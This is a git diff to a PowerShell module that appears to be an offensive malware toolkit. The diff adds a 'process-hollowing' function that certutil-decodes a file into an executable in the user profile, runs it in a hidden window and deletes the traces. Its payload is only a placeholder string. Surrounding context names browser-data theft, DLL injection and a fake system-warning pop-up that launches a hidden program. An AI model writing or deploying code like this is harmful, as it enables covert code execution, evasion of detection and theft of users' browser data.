@@ -324,6 +324,23 @@ getbrowserdata -ErrorAction SilentlyContinue
 Export-ModuleMember -Function getbrowserdata
 Set-Alias -Name getbrowserdata-Value getbrowserdata
 
+function process-hollowing {
+$Pcode = $args[0]
+$PcodeContent = "$Pcode"
+$Tmode = $args[1]  
+$Tmode = "`"$Tmode`""
+$TmodeContent = $Tmode
+cd $env:userprofile\
+echo ' musim opravit'> cod.txt
+sleep(0.7)
+certutil -decode "$env:userprofile\cod.txt" "$env:userprofile\holw.exe"
+sleep(1.1)
+del "$env:userprofile\cod.txt" -force
+$process = Start-Process "holw.exe" -ArgumentList "$PcodeContent" , "$TmodeContent" -WindowStyle Hidden -PassThru; $process.WaitForExit(); Remove-Item "holw.exe" -Force -ErrorAction SilentlyContinue
+}
+Export-ModuleMember -Function process-hollowing
+Set-Alias -Name process-hollowing -Value process-hollowing
+
 function process-injectionDll {
     param (
         [string]$DLLfile
@@ -432,6 +449,7 @@ function uninstaller {
 Export-ModuleMember -Function uninstaller
 Set-Alias -Name uninstaller -Value uninstaller -Description "Run code for uninstaller"
 
+
 #popevilbox -Text "Check your system" -Header "@NT-SYSTEM: Warning!!" -What "powershell start-process .\testgo.exe -windowstyle hidden"
 function popevilbox {
     param(
@@ -450,8 +468,7 @@ function popevilbox {
         # Uzavření System.Windows.Forms
         [System.Windows.Forms.Application]::Exit()
     }
+
 }
 Export-ModuleMember -Function popevilbox
 Set-Alias -Name popevilbox -Value popevilbox -Description "popevilbox"
-
-
